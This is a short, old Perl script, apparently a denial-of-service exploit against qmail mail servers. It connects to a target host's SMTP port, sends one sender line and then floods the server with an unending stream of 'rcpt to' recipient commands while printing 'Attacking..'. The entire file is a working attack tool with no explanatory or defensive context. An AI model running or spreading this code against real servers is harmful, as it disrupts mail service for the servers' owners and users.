#!/usr/local/bin/perl -w
# $Id: qmail.pl,v 1.4 1997/06/12 02:12:42 super Exp $
require 5.002;
use strict;
use Socket;
if(!($ARGV[0])){print("usage: $0 FQDN","\n");exit;}
my $port = 25; my $proto = getprotobyname("tcp");
my $iaddr = inet_aton($ARGV[0]) || die "No such host: $ARGV[0]";
my $paddr = sockaddr_in($port, $iaddr);
socket(SKT, AF_INET, SOCK_STREAM, $proto) || die "socket() $!";
connect(SKT, $paddr) && print("Connected established.\n") || die "connect() $!";
send(SKT,"mail from: <me\@me>\n",0) || die "send() $!";
my $infstr = "rcpt to: <me\@" . $ARGV[0] . ">\n"; print("Attacking..","\n");
while(<SKT>){
send(SKT,$infstr,0) || die "send() $!";
}
die "Connection lost!";
